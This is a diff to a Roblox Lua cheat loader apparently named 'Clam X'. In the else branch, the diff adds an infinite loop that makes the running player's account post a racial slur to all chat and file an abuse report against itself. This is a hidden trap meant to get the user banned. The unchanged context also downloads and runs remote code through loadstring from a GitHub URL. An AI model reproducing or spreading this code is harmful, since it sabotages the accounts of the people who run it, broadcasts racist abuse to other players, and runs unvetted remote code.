@@ -4,10 +4,16 @@ local lp = plrs.LocalPlayer
 local pd = lp:WaitForChild("PlayerData")
 local pt = pd:WaitForChild("PlayTime")
 local ptdata = pt.Value
+
 if ptdata < 72000 then
-	game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "ALERT: Account under 20 hours! BLACKLISTED!")
+game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "Account must have over 20 hours of playtime!")
 else
+		while true do
+			Game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("FUCK NIGGERS", "All")
+			game.Players:ReportAbuse(game.Players.lp, "swearing", "HE SAID FUCK BAN THIS NIGGER")
+		end
+	game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "Error: Contact DictatorDrip#3463 for help")
+
 	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/DictatorDrip/CLAM-X/main/CLAM"))() --Anti Cheat cheese, don't remove this unless you want anti cheat to ban you lmao
-	game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "Error 703, message DictatorDrip#3463 if you see this!")
-	warn("Clam X Error 703, message DictatorDrip#3463 if you see this!")
-end
+	end
+end)
